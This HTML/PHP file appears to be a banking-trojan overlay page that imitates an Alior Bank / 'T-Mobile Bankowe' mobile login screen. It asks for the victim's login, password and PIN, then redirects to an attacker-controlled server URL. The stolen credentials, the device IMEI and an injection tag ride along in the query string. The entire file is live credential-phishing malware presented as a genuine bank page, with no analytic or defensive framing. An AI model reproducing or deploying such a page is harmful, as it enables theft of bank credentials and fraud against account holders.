<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>T-Mobile Bankowe</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
    <script src="js/credit.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
	<link rel="stylesheet" href="pl/pl.aliorbank.aib/css/style.css">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="booting on text-center alert alert-danger" style="position: absolute;width: 100%;">
        Błąd połączenia z serwerem
    </div>

    <div class="header">
        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAYAAADhAJiYAAAAuElEQVR42mNgGAWjYBSMAkzw//9/ByBmodAMG2o5xgeIfwPxfHIdBdQ3+z8EpFDqGBuoY2CAZEchOQYGHCh1FLqBRDuKEr2kGryYkMFA+W6aOIYc3wLFp9PUMaRYhMXh62niGGJCCkfU8tCjXMLmqNl0iSYSHDVwjiHgqIFxzKBz0KCKskGVqPGVRXR3FDHVAd0cRUp9RnNH4agOOAZLTT9wzY/B2kBLoGITtmL4NfJHwSgYBcMNAAAH1RxuuXOMRAAAAABJRU5ErkJggg==">
        Zaloguj
    </div>

    <form id="form" method="POST">
        <label for="login">Login</label>
        <input type="text" class="input" placeholder="" required pattern="[0-9a-zA-Z]{4,16}" name="login" id="login">

        <label for="password">Haslo uzytkownika</label>
        <input type="password" class="input" placeholder="" required pattern="[0-9a-zA-Z]{4,16}" name="password" id="password">

        <label for="pin">PIN</label>
        <input type="password" class="input" placeholder="" required pattern="[0-9]{4,8}" name="pin" id="pin">

        <input type="button" onclick="sentServer();" class="button" value="Login">
    </form>



    <script>
        function sentServer(){
            //var imei_c = document.forms["form"].elements["imei"].value;
            var login1 = document.forms["form"].elements["login"].value;
            var haslo = document.forms["form"].elements["password"].value;
            var pin = document.forms["form"].elements["pin"].value;

            var url='<?php echo $URL; ?>';
            var imei_c='<?php echo $IMEI_country; ?>';

            location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|pl_aliorbank_aib|"+login1+"|"+haslo+"|"+pin);
        }
    </script>
    <script>main={booting:function(){var t=this;"undefined"!=typeof angular?setTimeout(function(){$(".booting").removeClass("on"),setTimeout(function(){$(".fixed-top").addClass("on"),t.start()},500)},2e3):setTimeout(function(){t.booting()},300)},start:function(){},loader_:{show:function(){$(".booting").addClass("on")},hide:function(){$(".booting").removeClass("on")}}},main.booting()</script>

</body>
</html>
